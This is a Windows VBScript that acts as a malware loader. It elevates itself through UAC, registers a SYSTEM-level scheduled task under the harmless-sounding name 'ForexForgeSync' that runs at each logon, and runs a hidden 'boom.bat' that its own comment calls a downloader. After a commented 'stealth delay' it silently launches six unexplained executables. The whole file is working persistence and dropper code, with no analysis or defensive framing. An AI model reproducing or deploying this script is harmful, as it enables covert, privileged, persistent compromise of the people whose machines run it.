Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get absolute paths
strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
strScript = WScript.ScriptFullName
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION ---
' Runs once to get Admin rights to install the SYSTEM task
If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
    UAC.ShellExecute "wscript.exe", Chr(34) & strScript & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: INSTALL THE SYSTEM-LEVEL TASK ---
strTaskName = "ForexForgeSync"

' We build the command carefully to avoid quote errors
' /RU "SYSTEM" = No window possible
' /RL HIGHEST = No UAC prompts
strRunCmd = "wscript.exe //B \""" & strScript & "\"" /task"
strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr """ & strRunCmd & """ /sc onlogon /rl highest /ru ""SYSTEM"" /f"

' Execute task creation and WAIT (True) for it to finish
WshShell.Run "cmd.exe /c " & strCreateTask, 0, True

' --- STEP 3: INITIAL SETUP (Only runs on first launch) ---
If WScript.Arguments.Named.Exists("elevate") Then
    ' Run your downloader/setup batch file hidden
    WshShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 4: STEALTH DELAY ---
' This 30s wait happens in the background (Session 0)
WScript.Sleep 30000 

' --- STEP 5: LAUNCH THE 6 APPS ---
' Using the '0' flag ensures these apps stay hidden
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False
WshShell.Run """" & strPath & "\file3.exe""", 0, False
WshShell.Run """" & strPath & "\file4.exe""", 0, False
WshShell.Run """" & strPath & "\file5.exe""", 0, False
WshShell.Run """" & strPath & "\file6.exe""", 0, False
